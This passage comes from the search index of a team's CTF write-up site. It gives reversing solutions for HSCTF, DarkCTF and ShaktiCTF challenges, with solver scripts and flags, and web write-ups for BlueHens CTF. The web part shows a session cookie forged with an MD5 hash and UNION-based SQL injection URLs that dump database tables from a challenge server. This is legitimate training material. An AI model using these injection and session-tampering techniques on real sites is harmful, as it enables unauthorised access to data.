angr import claripy import sys proj=angr.Project('./jack',load_options={'auto_load_libs':False},main_opts={'base_addr':0x400000}) flag=[claripy.BVS('flag%i'%i,8) for i in range(16)] flag_concat=claripy.Concat(*flag + [claripy.BVV(\"\\n\")]) state=proj.factory.entry_state(stdin=flag_concat) for i in flag: state.solver.add(i>=32) state.solver.add(i<=127) simgr=proj.factory.simgr(state) simgr.explore(find=0x401489,avoid=[0x4012B3, 0x401468]) if simgr.found: simulation=simgr.found[0] print(simulation.posix.dumps(sys.stdin.fileno())) else: print(\"FAILURE\") Output n0_5ymb0l1c,3x30 This output was enclosed in the flagformat and submitted","title":"Emojis - Misc HSCTF2020"},{"location":"reversing/DarkCTF/Jack/#emojis-misc-hsctf2020","text":"","title":"Emojis - Misc HSCTF2020"},{"location":"reversing/DarkCTF/Jack/#description","text":"We are given a binary which takes a string input and multiple math checks are performed on the input and had a good address which had to be achieved. The solution was obtained using a simple angr find and avoid script.","title":"Description"},{"location":"reversing/DarkCTF/Jack/#solution-script","text":"import angr import claripy import sys proj=angr.Project('./jack',load_options={'auto_load_libs':False},main_opts={'base_addr':0x400000}) flag=[claripy.BVS('flag%i'%i,8) for i in range(16)] flag_concat=claripy.Concat(*flag + [claripy.BVV(\"\\n\")]) state=proj.factory.entry_state(stdin=flag_concat) for i in flag: state.solver.add(i>=32) state.solver.add(i<=127) simgr=proj.factory.simgr(state) simgr.explore(find=0x401489,avoid=[0x4012B3, 0x401468]) if simgr.found: simulation=simgr.found[0] print(simulation.posix.dumps(sys.stdin.fileno())) else: print(\"FAILURE\")","title":"Solution Script"},{"location":"reversing/DarkCTF/Jack/#output","text":"n0_5ymb0l1c,3x30 This output was enclosed in the flagformat and submitted","title":"Output"},{"location":"reversing/HSCTF7/APLabEnglish/","text":"APLab:English Description Another java Reversing Challenge. We are given a java file which is to be reversed. Solution s=\"1dd3|y_3tttb5g\\`q]^dhn3j\" def unxor(string): ret='' xorstr=[4,1,3,1,2,1,3,0,1,4,3,1,2,0,1,4,1,2,3,2,1,0,3] for i in range(len(string)): ret+=chr(ord(string[i])^xorstr[i]) return ret def untranspose(string): ret=[None]\\*23 transpose=[11,18,15,19,8,17,5,2,12,6,21,0,22,7,13,14,4,16,20,1,3,10,9] for i in range(len(transpose)): ret[transpose[i]]=string[i] return ''.join(ret) for i in range(3): s=unxor(s) print(s) s=untranspose(s) print(s) Output 5eg2~x\\3upwc7gau\\\\gjo3i cj3o\\\\pg~i35uaug\\xe2gw7 gk0n^]sgm04watc]zf0fw4 40gf]sma^4wgtc0z]knf0w 01dg_rna_0tf}tb4{_hlg0t flag{n0t_t00_b4d_r1ght}","title":"APLab:English"},{"location":"reversing/HSCTF7/APLabEnglish/#aplabenglish","text":"","title":"APLab:English"},{"location":"reversing/HSCTF7/APLabEnglish/#description","text":"Another java Reversing Challenge. We are given a java file which is to be reversed.","title":"Description"},{"location":"reversing/HSCTF7/APLabEnglish/#solution","text":"s=\"1dd3|y_3tttb5g\\`q]^dhn3j\" def unxor(string): ret='' xorstr=[4,1,3,1,2,1,3,0,1,4,3,1,2,0,1,4,1,2,3,2,1,0,3] for i in range(len(string)): ret+=chr(ord(string[i])^xorstr[i]) return ret def untranspose(string): ret=[None]\\*23 transpose=[11,18,15,19,8,17,5,2,12,6,21,0,22,7,13,14,4,16,20,1,3,10,9] for i in range(len(transpose)): ret[transpose[i]]=string[i] return ''.join(ret) for i in range(3): s=unxor(s) print(s) s=untranspose(s) print(s)","title":"Solution"},{"location":"reversing/HSCTF7/APLabEnglish/#output","text":"5eg2~x\\3upwc7gau\\\\gjo3i cj3o\\\\pg~i35uaug\\xe2gw7 gk0n^]sgm04watc]zf0fw4 40gf]sma^4wgtc0z]knf0w 01dg_rna_0tf}tb4{_hlg0t flag{n0t_t00_b4d_r1ght}","title":"Output"},{"location":"reversing/HSCTF7/ComputerScience/","text":"APLab:Computer Science principle HSCTF Description A java RE challenge from HSCTF 2020 The challenge gives a simple java code ,which basically takes in an input of length 18, if (inp.length()!=18) { System.out.println(\"Your input is incorrect.\"); System.exit(0) } Convert it to a string through different functions inp=shift2(shift(inp)); where shift2(): public static String shift2(String input) { String ret = \"\"; for (int i = 0; i<input.length(); i++) { ret+=(char)(input.charAt(i)+ Integer.toString((int)input.charAt(i)).length()); } System.out.println(ret); return ret; } Shift(): public static String shift(String input) { String ret = \"\"; for (int i = 0; i<input.length(); i++) { ret+=(char)(input.charAt(i)-i); } System.out.println(ret); return ret; } and checks if inp is the string given.: if (inp.equals(\"inagzgkpm)Wl&Tg&io\")) { System.out.println(\"Correct. Your input is the flag.\"); } else { System.out.println(\"Your input is incorrect.\"); } So all the program needed was to reverse it to get the input they are asking for Hence import java.util.Scanner; public class ComputerSciencePrinciples { public static void main(String[] args) { Scanner sc = new Scanner(System.in); String inp = sc.nextLine(); if (inp.length()!=18) { System.out.println(\"Your input is incorrect.\"); System.exit(0); } String x=shift2(inp); String y=shift(x); System.out.println(inp); } public static String shift(String input) { String ret = \"\"; for (int i = 0; i<input.length(); i++) { ret+=(char)(input.charAt(i)+i); } System.out.println(ret); return ret; } public static String shift2(String input) { String ret = \"\"; for (int i = 0; i<input.length(); i++) { ret+=(char)(input.charAt(i)-Integer.toString((int)input.charAt(i)).length()); } System.out.println(ret); return ret; } } Where if input is given as:\"inagzgkpm)Wl&Tg&io\" Give: flag{intr0_t0_r3v}","title":"ComputerScience"},{"location":"reversing/HSCTF7/ComputerScience/#aplabcomputer-science-principle-hsctf","text":"","title":"APLab:Computer Science principle HSCTF"},{"location":"reversing/HSCTF7/ComputerScience/#description","text":"A java RE challenge from HSCTF 2020 The challenge gives a simple java code ,which basically takes in an input of length 18, if (inp.length()!=18) { System.out.println(\"Your input is incorrect.\"); System.exit(0) } Convert it to a string through different functions inp=shift2(shift(inp)); where shift2(): public static String shift2(String input) { String ret = \"\"; for (int i = 0; i<input.length(); i++) { ret+=(char)(input.charAt(i)+ Integer.toString((int)input.charAt(i)).length()); } System.out.println(ret); return ret; } Shift(): public static String shift(String input) { String ret = \"\"; for (int i = 0; i<input.length(); i++) { ret+=(char)(input.charAt(i)-i); } System.out.println(ret); return ret; } and checks if inp is the string given.: if (inp.equals(\"inagzgkpm)Wl&Tg&io\")) { System.out.println(\"Correct. Your input is the flag.\"); } else { System.out.println(\"Your input is incorrect.\"); } So all the program needed was to reverse it to get the input they are asking for Hence import java.util.Scanner; public class ComputerSciencePrinciples { public static void main(String[] args) { Scanner sc = new Scanner(System.in); String inp = sc.nextLine(); if (inp.length()!=18) { System.out.println(\"Your input is incorrect.\"); System.exit(0); } String x=shift2(inp); String y=shift(x); System.out.println(inp); } public static String shift(String input) { String ret = \"\"; for (int i = 0; i<input.length(); i++) { ret+=(char)(input.charAt(i)+i); } System.out.println(ret); return ret; } public static String shift2(String input) { String ret = \"\"; for (int i = 0; i<input.length(); i++) { ret+=(char)(input.charAt(i)-Integer.toString((int)input.charAt(i)).length()); } System.out.println(ret); return ret; } } Where if input is given as:\"inagzgkpm)Wl&Tg&io\" Give: flag{intr0_t0_r3v}","title":"Description"},{"location":"reversing/HSCTF7/Dis/","text":"Dis HSCTF2020 Description The challenge was a python bytecode challenge where the approach I chose was to maually replicate the bytecode from the documentation of the dis module in python which took up a while. Im not sure if there's a less time consuming approach but once that was done the reversing part was automated using Z3. Solution bytestring=b'\\xae\\xc0\\xa1\\xab\\xef\\x15\\xd8\\xca\\x18\\xc6\\xab\\x17\\x93\\xa8\\x11\\xd7\\x18\\x15\\xd7\\x17\\xbd\\x9a\\xc0\\xe9\\x93\\x11\\xa7\\x04\\xa1\\x1c\\x1c\\xed' from z3 import * def a(s): o = [0] * 32 for i in range(32): o[i] = ((s[i]+s[i])-60) return o def b(s,t): for x,y in zip(s,t): yield(x+y)-50 def c(s): return [x+5 for x in s] def e(s): s = [ i for i in s ] o = [ (o^5)-30 for o in b(a(s),c(s)) ] return o def main(): sol=Solver() o=b'\\xae\\xc0\\xa1\\xab\\xef\\x15\\xd8\\xca\\x18\\xc6\\xab\\x17\\x93\\xa8\\x11\\xd7\\x18\\x15\\xd7\\x17\\xbd\\x9a\\xc0\\xe9\\x93\\x11\\xa7\\x04\\xa1\\x1c\\x1c\\xed' l=list(o) s = [ BitVec('s[%s]' % i, 8) for i in range(32) ] s = e(s) for i in range(len(l)): sol.add(s[i]==l[i]) print(sol.check()) print(sol.model()) main() Flag: flag{5tr4ng3_d1s45s3mbly_1c0a88}","title":"Dis HSCTF2020"},{"location":"reversing/HSCTF7/Dis/#dis-hsctf2020","text":"","title":"Dis HSCTF2020"},{"location":"reversing/HSCTF7/Dis/#description","text":"The challenge was a python bytecode challenge where the approach I chose was to maually replicate the bytecode from the documentation of the dis module in python which took up a while. Im not sure if there's a less time consuming approach but once that was done the reversing part was automated using Z3.","title":"Description"},{"location":"reversing/HSCTF7/Dis/#solution","text":"bytestring=b'\\xae\\xc0\\xa1\\xab\\xef\\x15\\xd8\\xca\\x18\\xc6\\xab\\x17\\x93\\xa8\\x11\\xd7\\x18\\x15\\xd7\\x17\\xbd\\x9a\\xc0\\xe9\\x93\\x11\\xa7\\x04\\xa1\\x1c\\x1c\\xed' from z3 import * def a(s): o = [0] * 32 for i in range(32): o[i] = ((s[i]+s[i])-60) return o def b(s,t): for x,y in zip(s,t): yield(x+y)-50 def c(s): return [x+5 for x in s] def e(s): s = [ i for i in s ] o = [ (o^5)-30 for o in b(a(s),c(s)) ] return o def main(): sol=Solver() o=b'\\xae\\xc0\\xa1\\xab\\xef\\x15\\xd8\\xca\\x18\\xc6\\xab\\x17\\x93\\xa8\\x11\\xd7\\x18\\x15\\xd7\\x17\\xbd\\x9a\\xc0\\xe9\\x93\\x11\\xa7\\x04\\xa1\\x1c\\x1c\\xed' l=list(o) s = [ BitVec('s[%s]' % i, 8) for i in range(32) ] s = e(s) for i in range(len(l)): sol.add(s[i]==l[i]) print(sol.check()) print(sol.model()) main() Flag: flag{5tr4ng3_d1s45s3mbly_1c0a88}","title":"Solution"},{"location":"reversing/HSCTF7/Statistics/","text":"APLab:Statistics HSCTF Description A fun Java RE challenge from HSCTF-2020 The given file was a .class file which had to be converted to a .java file using any online converters or tools like jadx.Once you get the .java file I was initially not able to convert the java code due to an invoke to call a direct java bytecode for which I simply changed the line to an equivalent funtion that is simply toString to fix that. Thereafter we figured that the code was performing certain manipulations on the input and would simply check between the two strings. But the catch was where there was a sortof non reversible bubble sort kind of algorithm which picked up the two smallest values in the string and pushed them to the end of the string. And due to that a few charecters of the flag had to be guessed. However the following is the script that we used to solve the challenge. Solution import java.util.Scanner; public class statistics { public static void main(final String[] args) { int[] arr = {102,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}; // checkstring=\"qtqnhuyj{fjw{rwhswzppfnfrz|qndfktceyba\" String com = \"fqntqdhuyj{fjw{rwhswzppfnbrz|qncfktaey\"; String guess = \"abcdefghijklmnopqrstuvwxyz{_}|\"; System.out.print(\"f\"); for (int i = 1 ; i<com.length() ; i ++){ char st = com.charAt(i); for (int k = 0;k< guess.length();k++){ if (arr[i - 1] % 2 == 0) { arr[i] = guess.charAt(k) + (arr[i - 1] - 97); } else { arr[i] = guess.charAt(k) - (arr[i - 1] - 97); } arr[i] = (arr[i] - 97 + 29)%29 + 97; if((char)arr[i] == st){ System.out.print(guess.charAt(k)); break; } //System.out.println((char)arr[i]); }} } } Output: flag{tenpercentofallstatirqicsashfake} We had to perform several tries to finally guess the few last charecters we needed to complete the flag. But it was worth! Flag: flag{tenpercentofallstatitoicsarefake}","title":"APLab:Statistics HSCTF"},{"location":"reversing/HSCTF7/Statistics/#aplabstatistics-hsctf","text":"","title":"APLab:Statistics HSCTF"},{"location":"reversing/HSCTF7/Statistics/#description","text":"A fun Java RE challenge from HSCTF-2020 The given file was a .class file which had to be converted to a .java file using any online converters or tools like jadx.Once you get the .java file I was initially not able to convert the java code due to an invoke to call a direct java bytecode for which I simply changed the line to an equivalent funtion that is simply toString to fix that. Thereafter we figured that the code was performing certain manipulations on the input and would simply check between the two strings. But the catch was where there was a sortof non reversible bubble sort kind of algorithm which picked up the two smallest values in the string and pushed them to the end of the string. And due to that a few charecters of the flag had to be guessed. However the following is the script that we used to solve the challenge.","title":"Description"},{"location":"reversing/HSCTF7/Statistics/#solution","text":"import java.util.Scanner; public class statistics { public static void main(final String[] args) { int[] arr = {102,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}; // checkstring=\"qtqnhuyj{fjw{rwhswzppfnfrz|qndfktceyba\" String com = \"fqntqdhuyj{fjw{rwhswzppfnbrz|qncfktaey\"; String guess = \"abcdefghijklmnopqrstuvwxyz{_}|\"; System.out.print(\"f\"); for (int i = 1 ; i<com.length() ; i ++){ char st = com.charAt(i); for (int k = 0;k< guess.length();k++){ if (arr[i - 1] % 2 == 0) { arr[i] = guess.charAt(k) + (arr[i - 1] - 97); } else { arr[i] = guess.charAt(k) - (arr[i - 1] - 97); } arr[i] = (arr[i] - 97 + 29)%29 + 97; if((char)arr[i] == st){ System.out.print(guess.charAt(k)); break; } //System.out.println((char)arr[i]); }} } } Output: flag{tenpercentofallstatirqicsashfake} We had to perform several tries to finally guess the few last charecters we needed to complete the flag. But it was worth! Flag: flag{tenpercentofallstatitoicsarefake}","title":"Solution"},{"location":"reversing/ShaktiCTF/Margaret/","text":"Author Simran Sandra Challenge Short Writeup The challenge was a packed GoVM binary which had a hidden flag. The intended solution to the challenge being, to solve the challenge the intended solution is to go through the binary and find out the conditions to be satisfied for the input to satisfy and add the constraints to the z3 solver. Solver result = [165,72,3104,3424,3712,3360,3168,107,104448,203,98,119808,105,127,102,106,196,114,98,160,177,167,68,53,111,3200,99,150,127,3520,39,118784,95,72,99328,120832,42,175,77,167,99,104,175,118784,17,100,1632,86,148,69,3712,127,7,95,181,123904,127,104,43,91,127,111616,147,66,103,43,116736,1632,118784,111,73728,52,77,17,92,135,79,110,17,93] opcode = [4, 8, 3, 3, 3, 3, 3, 6, 2, 5, 4, 2, 6, 8, 4, 6, 5, 7, 4, 4, 5, 4, 1, 7, 1, 3, 4, 4, 8, 3, 6, 2, 7, 8, 2, 2, 6, 5, 8, 4, 7, 7, 5, 2, 8, 6, 3, 6, 4, 1, 3, 8, 1, 6, 5, 2, 8, 7, 6, 6, 8, 2, 4, 1, 7, 6, 2, 3, 2, 1, 2, 7, 8, 8, 1, 5, 8, 7, 1, 8] import math def xor(argument): return argument^0x30 def mult(argument): return math.ceil(argument/1024) def mul(argument): return math.ceil(argument/0x20) def division(argument): return math.ceil(argument-0x32) def add(argument): return argument-0x50 def sub(argument): return argument+0x9 def div(argument): return argument def andd(argument): return argument^0x20 def default(argument): return \"Incorrect case\" switcher = { 1: xor, 2: mult, 3: mul, 4: division, 5: add, 6: sub, 7: div, 8: andd } def switch(operation, num1): return switcher.get(operation, default)(num1) flag=[] for i in range(80): flag.append(switch(opcode[i], result[i])) flag=[chr(int(k)) for k in flag] print(flag) Flag shaktictf{0ur_4str0naut5_d1d_n0t_hav3_much_t1m3_but_7hey_h4d_marg4r3t_H4m1l7on!}","title":"Margaret"},{"location":"reversing/ShaktiCTF/Margaret/#author","text":"Simran Sandra","title":"Author"},{"location":"reversing/ShaktiCTF/Margaret/#challenge-short-writeup","text":"The challenge was a packed GoVM binary which had a hidden flag. The intended solution to the challenge being, to solve the challenge the intended solution is to go through the binary and find out the conditions to be satisfied for the input to satisfy and add the constraints to the z3 solver.","title":"Challenge Short Writeup"},{"location":"reversing/ShaktiCTF/Margaret/#solver","text":"result = [165,72,3104,3424,3712,3360,3168,107,104448,203,98,119808,105,127,102,106,196,114,98,160,177,167,68,53,111,3200,99,150,127,3520,39,118784,95,72,99328,120832,42,175,77,167,99,104,175,118784,17,100,1632,86,148,69,3712,127,7,95,181,123904,127,104,43,91,127,111616,147,66,103,43,116736,1632,118784,111,73728,52,77,17,92,135,79,110,17,93] opcode = [4, 8, 3, 3, 3, 3, 3, 6, 2, 5, 4, 2, 6, 8, 4, 6, 5, 7, 4, 4, 5, 4, 1, 7, 1, 3, 4, 4, 8, 3, 6, 2, 7, 8, 2, 2, 6, 5, 8, 4, 7, 7, 5, 2, 8, 6, 3, 6, 4, 1, 3, 8, 1, 6, 5, 2, 8, 7, 6, 6, 8, 2, 4, 1, 7, 6, 2, 3, 2, 1, 2, 7, 8, 8, 1, 5, 8, 7, 1, 8] import math def xor(argument): return argument^0x30 def mult(argument): return math.ceil(argument/1024) def mul(argument): return math.ceil(argument/0x20) def division(argument): return math.ceil(argument-0x32) def add(argument): return argument-0x50 def sub(argument): return argument+0x9 def div(argument): return argument def andd(argument): return argument^0x20 def default(argument): return \"Incorrect case\" switcher = { 1: xor, 2: mult, 3: mul, 4: division, 5: add, 6: sub, 7: div, 8: andd } def switch(operation, num1): return switcher.get(operation, default)(num1) flag=[] for i in range(80): flag.append(switch(opcode[i], result[i])) flag=[chr(int(k)) for k in flag] print(flag)","title":"Solver"},{"location":"reversing/ShaktiCTF/Margaret/#flag","text":"shaktictf{0ur_4str0naut5_d1d_n0t_hav3_much_t1m3_but_7hey_h4d_marg4r3t_H4m1l7on!}","title":"Flag"},{"location":"reversing/ShaktiCTF/deceev/","text":"Deceev Challenge Writeup This challenge basically acts as a base64 encoding service where whatever string you give as a binary the base64 encoded string is returned, or at least tahts what it looks like at first sight. Well, the challenge name suggests that it is a deceptive challenge. The challenge in its normal behaviour does not enter functions that seem suspicious. int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // rdx __int64 v4; // rdx int result; // eax __int64 v6; // [rsp-30h] [rbp-30h] __int64 v7; // [rsp-28h] [rbp-28h] __int64 v8; // [rsp-20h] [rbp-20h] const char *v9; // [rsp-18h] [rbp-18h] __asm { endbr64 } sub_10E0(\"Enter the string you want to encode :\\t\", argv, envp); ((void (__fastcall *)(__int64, __int64))sub_10F0)(256LL, _bss_start); sub_10E0(\"%d %d %d %d %d\\n\", 47LL, 48LL); v3 = ((__int64 (__fastcall *)())sub_10D0)(); v6 = ((__int64 (__fastcall *)(__int64))b64_encode)(v3); sub_10E0(\"encoded: %s\\n\", v6, v4); v7 = b64_decoded_size(v6) + 1; v8 = sub_1110(v7); if ( (unsigned int)b64_decode(v6, v8, v7) ) { if ( argc == 2 ) { v9 = argv[1]; sub_1110(256LL); ZDNjMTN2Mw(v9); } *(_BYTE *)(v8 + v7) = 0; sub_10B0(v8); sub_10C0(\"Good Day!\"); result = 0; } else { sub_10C0(\"Decode Failure\"); result = 1; } return result; } Checker Code __int64 __fastcall ZDNjMTN2Mw(__int64 a1) { __int64 v1; // rax __int64 v2; // rax __int64 v4; // [rsp-10h] [rbp-10h] __asm { endbr64 } v4 = sub_1110(256LL); manipulate(a1, 0LL, v4); v1 = sub_10D0(v4); v2 = b64_encode(v4, v1); if ( !(unsigned int)sub_1100( v2, \"c2JodWFna2d0eWktY210M2Y1ezVkYjN1Y2czZ3B5dC0xbTAzbjVfNTFiNXVfZzNndnkzLXJteTN3NWg1M2JydTNnfWc=\") ) sub_10C0(\"\\nYup, you got me :P\\nYour input is your flag!!\"); return sub_10C0(\"Exiting peacefully\"); } So taking a deeper look at the decompilation from ghidra/IDA and compare it with another base64 encoding code from online you can notice the differance in the charset used for encoding (This is the intended solution :P). On going through the path followed by your input you can see that your input is being modified at alternate indices with chars from the string buggy-m355 . This input goes further for the encoding process. Decoding the hardcoded b64(like) c2JodWFna2d0eWktY210M2Y1ezVkYjN1Y2czZ3B5dC0xbTAzbjVfNTFiNXVfZzNndnkzLXJteTN3NWg1M2JydTNnfWc= string with the charset used in the binary gives you this string. flag = 'sbhuagkgtyi-cmt3f5{5db3ucg3gpyt-1m03n5_51b5u_g3gvy3-rmy3w5h53bru3g}g'[::2] Flag shaktictf{d3c3pt10n_15_3v3rywh3r3} Which is the flag. Hope you liked the challenge!!","title":"Deceev"},{"location":"reversing/ShaktiCTF/deceev/#deceev","text":"","title":"Deceev"},{"location":"reversing/ShaktiCTF/deceev/#challenge-writeup","text":"This challenge basically acts as a base64 encoding service where whatever string you give as a binary the base64 encoded string is returned, or at least tahts what it looks like at first sight. Well, the challenge name suggests that it is a deceptive challenge. The challenge in its normal behaviour does not enter functions that seem suspicious. int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // rdx __int64 v4; // rdx int result; // eax __int64 v6; // [rsp-30h] [rbp-30h] __int64 v7; // [rsp-28h] [rbp-28h] __int64 v8; // [rsp-20h] [rbp-20h] const char *v9; // [rsp-18h] [rbp-18h] __asm { endbr64 } sub_10E0(\"Enter the string you want to encode :\\t\", argv, envp); ((void (__fastcall *)(__int64, __int64))sub_10F0)(256LL, _bss_start); sub_10E0(\"%d %d %d %d %d\\n\", 47LL, 48LL); v3 = ((__int64 (__fastcall *)())sub_10D0)(); v6 = ((__int64 (__fastcall *)(__int64))b64_encode)(v3); sub_10E0(\"encoded: %s\\n\", v6, v4); v7 = b64_decoded_size(v6) + 1; v8 = sub_1110(v7); if ( (unsigned int)b64_decode(v6, v8, v7) ) { if ( argc == 2 ) { v9 = argv[1]; sub_1110(256LL); ZDNjMTN2Mw(v9); } *(_BYTE *)(v8 + v7) = 0; sub_10B0(v8); sub_10C0(\"Good Day!\"); result = 0; } else { sub_10C0(\"Decode Failure\"); result = 1; } return result; } Checker Code __int64 __fastcall ZDNjMTN2Mw(__int64 a1) { __int64 v1; // rax __int64 v2; // rax __int64 v4; // [rsp-10h] [rbp-10h] __asm { endbr64 } v4 = sub_1110(256LL); manipulate(a1, 0LL, v4); v1 = sub_10D0(v4); v2 = b64_encode(v4, v1); if ( !(unsigned int)sub_1100( v2, \"c2JodWFna2d0eWktY210M2Y1ezVkYjN1Y2czZ3B5dC0xbTAzbjVfNTFiNXVfZzNndnkzLXJteTN3NWg1M2JydTNnfWc=\") ) sub_10C0(\"\\nYup, you got me :P\\nYour input is your flag!!\"); return sub_10C0(\"Exiting peacefully\"); } So taking a deeper look at the decompilation from ghidra/IDA and compare it with another base64 encoding code from online you can notice the differance in the charset used for encoding (This is the intended solution :P). On going through the path followed by your input you can see that your input is being modified at alternate indices with chars from the string buggy-m355 . This input goes further for the encoding process. Decoding the hardcoded b64(like) c2JodWFna2d0eWktY210M2Y1ezVkYjN1Y2czZ3B5dC0xbTAzbjVfNTFiNXVfZzNndnkzLXJteTN3NWg1M2JydTNnfWc= string with the charset used in the binary gives you this string. flag = 'sbhuagkgtyi-cmt3f5{5db3ucg3gpyt-1m03n5_51b5u_g3gvy3-rmy3w5h53bru3g}g'[::2]","title":"Challenge Writeup"},{"location":"reversing/ShaktiCTF/deceev/#flag","text":"shaktictf{d3c3pt10n_15_3v3rywh3r3} Which is the flag. Hope you liked the challenge!!","title":"Flag"},{"location":"reversing/ShaktiCTF/fusk/","text":"Fusk Challenge Concept Vey simple basic RE challenge where the binary decompilation itself can give you the required arrays to reverse the xor algo used to encrypted with a recursive fib sequence function. __int64 __fastcall main(__int64 a1, char **a2, char **a3) { unsigned int v3; // eax __int64 result; // rax int v5; // [rsp-D0h] [rbp-D0h] int i; // [rsp-CCh] [rbp-CCh] __int64 v7; // [rsp-C8h] [rbp-C8h] __int64 v8; // [rsp-48h] [rbp-48h] unsigned __int64 v9; // [rsp-20h] [rbp-20h] __int64 v10; // [rsp-8h] [rbp-8h] __asm { endbr64 } v9 = __readfsqword(0x28u); v5 = 3; sub_10B0(&v8, 32LL, stdin); for ( i = 0; i < sub_1090(&v8); ++i ) { v3 = v5++; *(&v10 + i - 48) = sub_11A9(v3) ^ *(&v10 + i - 64); } if ( sub_11E9(&v7) ) sub_1080(\"You Win\"); else sub_1080(\"Try Again..!\"); result = 0LL; if ( __readfsqword(0x28u) != v9 ) result = sub_10A0(); return result; The recursive function being, function: sub_11E9(&v7) Flag flag = shaktictf{s1mpl3_movfu5ca7i0n}","title":"Fusk"},{"location":"reversing/ShaktiCTF/fusk/#fusk","text":"","title":"Fusk"},{"location":"reversing/ShaktiCTF/fusk/#challenge-concept","text":"Vey simple basic RE challenge where the binary decompilation itself can give you the required arrays to reverse the xor algo used to encrypted with a recursive fib sequence function. __int64 __fastcall main(__int64 a1, char **a2, char **a3) { unsigned int v3; // eax __int64 result; // rax int v5; // [rsp-D0h] [rbp-D0h] int i; // [rsp-CCh] [rbp-CCh] __int64 v7; // [rsp-C8h] [rbp-C8h] __int64 v8; // [rsp-48h] [rbp-48h] unsigned __int64 v9; // [rsp-20h] [rbp-20h] __int64 v10; // [rsp-8h] [rbp-8h] __asm { endbr64 } v9 = __readfsqword(0x28u); v5 = 3; sub_10B0(&v8, 32LL, stdin); for ( i = 0; i < sub_1090(&v8); ++i ) { v3 = v5++; *(&v10 + i - 48) = sub_11A9(v3) ^ *(&v10 + i - 64); } if ( sub_11E9(&v7) ) sub_1080(\"You Win\"); else sub_1080(\"Try Again..!\"); result = 0LL; if ( __readfsqword(0x28u) != v9 ) result = sub_10A0(); return result; The recursive function being, function: sub_11E9(&v7)","title":"Challenge Concept"},{"location":"reversing/ShaktiCTF/fusk/#flag","text":"flag = shaktictf{s1mpl3_movfu5ca7i0n}","title":"Flag"},{"location":"web/intro/","text":"Web Exploitaion Introduction \"Write about Web Exploitation and about the writeups\" The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. Dawg CTF 2020 FreeWifi 2 BlueHens CTF 2021 <<<<<<< HEAD speedrun-1 - Sivakami Praveen speedrun-2 - Sivakami Praveen Speedrun- 3 - Aiswarya Nair","title":"Web Exploitaion"},{"location":"web/intro/#web-exploitaion","text":"","title":"Web Exploitaion"},{"location":"web/intro/#introduction","text":"\"Write about Web Exploitation and about the writeups\"","title":"Introduction"},{"location":"web/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. Dawg CTF 2020 FreeWifi 2 BlueHens CTF 2021 <<<<<<< HEAD speedrun-1 - Sivakami Praveen speedrun-2 - Sivakami Praveen Speedrun- 3 - Aiswarya Nair","title":"The contents of this repo"},{"location":"web/BlueHensCTF2021/speedrun-1/sp1/","text":"speedrun-1 Description Solution When we visit the url we find this static page that just says hello User 2 We notice there is a session cookie. PHPSESSID is generally produced using MD5. c81e728d9d4c2f636f067f89cc14862c is the MD5 hash of 2 . Let's try changing the value. MD5(1) = c4ca4238a0b923820dcc509a6f75849b This gave us the flag:","title":"speedrun-1"},{"location":"web/BlueHensCTF2021/speedrun-1/sp1/#speedrun-1","text":"","title":"speedrun-1"},{"location":"web/BlueHensCTF2021/speedrun-1/sp1/#description","text":"","title":"Description"},{"location":"web/BlueHensCTF2021/speedrun-1/sp1/#solution","text":"When we visit the url we find this static page that just says hello User 2 We notice there is a session cookie. PHPSESSID is generally produced using MD5. c81e728d9d4c2f636f067f89cc14862c is the MD5 hash of 2 . Let's try changing the value. MD5(1) = c4ca4238a0b923820dcc509a6f75849b This gave us the flag:","title":"Solution"},{"location":"web/BlueHensCTF2021/speedrun-2/sp2/","text":"speedrun-2 Description Solution Looking at the script it is obvious this is an SQLi. The course table does not seem to contain any values useful to us. Let's try searching for other tables: http://challenges.ctfd.io:30026/?credits=1+union+select+1,2,3,tbl_name+FROM+sqlite_master We notice there is table flag_xor_shares that looks interesting. Lets try viewing the structure of the table: http://challenges.ctfd.io:30026/?credits=1+union+select+1,2,3,sql+FROM+sqlite_master+where+name=%27flag_xor_shares%27 http://challenges.ctfd.io:30026/?credits=1+union+select+id,hexdigest,3,4+from+flag_xor_shares The contents of the table are secret shares. XORing them together should give us the flag. I wrote a quick script for this from pwn import xor KEY1 = bytes.fromhex(\"7419ccad9d5949e66614cd9458cdac149c2ad981c9f3ec56d30d03e730631c23598394a6055c55ecb5bec49dd0043b9fde76\") KEY2 = bytes.fromhex(\"835db37484676a462e223024a365c91fcdfe53ff975852abfacb79e0f3aef8d5b897a36c6fbfde9ca8e63b3ee00d3a1830f1\") key3 = bytes.fromhex(\"9c5890b6230771372122e9352ed1f3a1f644c9d4e451b81cb2f6643a067669972dc6a06617eaf08e539ada9a92b713b09b0c\") key4 = bytes.fromhex(\"53e5553b467e4badfcee4d97262445b27cdad3ced69a7fc69e0a04196685a61052cdd2f8a7a9650a0d861707f51403ccebc3\") key5 = bytes.fromhex(\"6dbdf9003a3c710afbc92a669f248c6fbe15fc550753264477436a5093614a2efc76310bb7906c911c305a0a39f566c8fc35\") flag = xor(KEY1, KEY2, key3, key4, key5) print(flag.decode()) UDCTF{h0n3stly_we_l1k3_crypt0_a_bit_m0re_th4n_w3b}","title":"speedrun-2"},{"location":"web/BlueHensCTF2021/speedrun-2/sp2/#speedrun-2","text":"","title":"speedrun-2"},{"location":"web/BlueHensCTF2021/speedrun-2/sp2/#description","text":"","title":"Description"},{"location":"web/BlueHensCTF2021/speedrun-2/sp2/#solution","text":"Looking at the script it is obvious this is an SQLi. The course table does not seem to contain any values useful to us. Let's try searching for other tables: http://challenges.ctfd.io:30026/?credits=1+union+select+1,2,3,tbl_name+FROM+sqlite_master We notice there is table flag_xor_shares that looks interesting. Lets try viewing the structure of the table: http://challenges.ctfd.io:30026/?credits=1+union+select+1,2,3,sql+FROM+sqlite_master+where+name=%27flag_xor_shares%27 http://challenges.ctfd.io:30026/?credits=1+union+select+id,hexdigest,3,4+from+flag_xor_shares The contents of the table are secret shares. XORing them together should give us the flag. I wrote a quick script for this from pwn import xor KEY1 = bytes.fromhex(\"7419ccad9d5949e66614cd9458cdac149c2ad981c9f3ec56d30d03e730631c23598394a6055c55ecb5bec49dd0043b9fde76\") KEY2 = 